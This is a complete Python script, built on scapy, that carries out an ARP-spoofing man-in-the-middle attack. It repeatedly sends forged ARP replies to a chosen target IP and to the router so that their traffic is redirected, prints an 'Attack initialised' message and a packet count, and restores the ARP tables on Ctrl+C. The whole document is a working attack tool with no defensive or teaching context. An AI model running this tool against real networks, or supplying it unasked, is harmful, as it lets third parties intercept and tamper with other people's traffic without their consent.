#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse
import sys

def getargs():
    parser=argparse.ArgumentParser()
    parser.add_argument("--target","-t",dest="target",help="Specify the target IP : Generally it's a user IP")
    parser.add_argument("--spoof","-s",dest="spoof",help="Specify the spoofed IP : Generally it's the Router IP")
    args=parser.parse_args()
    if not args.target or not args.spoof :
        parser.error("[-] Please specify the required arguments")
    else:    
        return args

def getmac(ip) :
    arp_req=scapy.ARP(pdst=ip)
    ether_broa=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broa=ether_broa/arp_req 
    answered = scapy.srp(arp_broa,verbose=False,timeout=7)[0]
    return answered[0][1].hwsrc
    


def spoof (target_ip,spoof_ip) :
    mac_dest=getmac(target_ip)
    req=scapy.ARP(op=2,psrc=spoof_ip ,pdst=target_ip,hwdst=mac_dest )
    scapy.send(req,verbose=False)

def restore (dest_ip,src_ip):
    macsrc = getmac(src_ip)
    macdst = getmac(dest_ip)
    req=scapy.ARP(op=2,psrc=src_ip,pdst=dest_ip,hwdst=macdst,hwsrc = macsrc)
    scapy.send(req,verbose=False ,count=2)

ip=getargs()
if ip is not None :
    target_ip = ip.target
    spoof_ip = ip.spoof
    try:
        x=0
        while True :
            spoof(target_ip,spoof_ip)
            spoof(spoof_ip,target_ip)
            time.sleep(2)
            x=x+2 
            if x==2 :
                print("[+] Attack initialised !")
            print("\r[+] Packets sent : "+str(x)),  
            sys.stdout.flush()    
    except KeyboardInterrupt :
        print("\n[+] Ctrl + C Detected , We are restoring everything to Normal ..")
        restore(target_ip,spoof_ip)
        restore(spoof_ip,target_ip)
    except IndexError:
        print("[-] Couldn't get the mac address")    
